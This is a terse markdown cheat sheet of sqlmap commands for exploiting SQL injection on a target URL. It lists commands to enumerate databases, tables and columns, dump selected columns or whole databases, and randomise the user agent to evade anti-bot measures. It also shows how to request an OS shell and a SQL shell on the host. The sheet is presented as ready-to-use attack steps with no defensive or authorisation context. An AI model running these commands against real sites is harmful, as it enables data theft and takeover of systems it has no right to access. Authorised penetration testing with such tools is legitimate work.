# Discovery the database list

```
sqlmap -u "urls" --dbs
```

Will getting some list of Database on the host


# Discovery tables list

```
sqlmap -u "urls" -D "database" --tables
```


# Get the columns list

```
sqlmap -u "urls" -D "database" -T "tables" --columns
```

# Dump specify columns with 

```
sqlmap -u "urls" -D "database" -T "tables" -C "columns" --dump
```
```
sqlmap -u "urls" -D "database" -T "tables" -C "columns,columns" --dump
```
# Dump the entire columns 

```
sqlmap -u "urls" -D "database" -T "tables" --dump
```

# Add some configuration

## Randoming the User-Agent for anti-bots
```
sqlmap -u "urls" -D "database" -T "tables" --dump --random-agent
```

## Trying get the OS-Shell
```
sqlmap -u "urls" --os-shell
```

## The SQL Shell 
```
sqlmap -u "urls" --sql-shell
```


# Tired? Dump All the things

```
sqlmap -u "urls" -D --dump-all
```
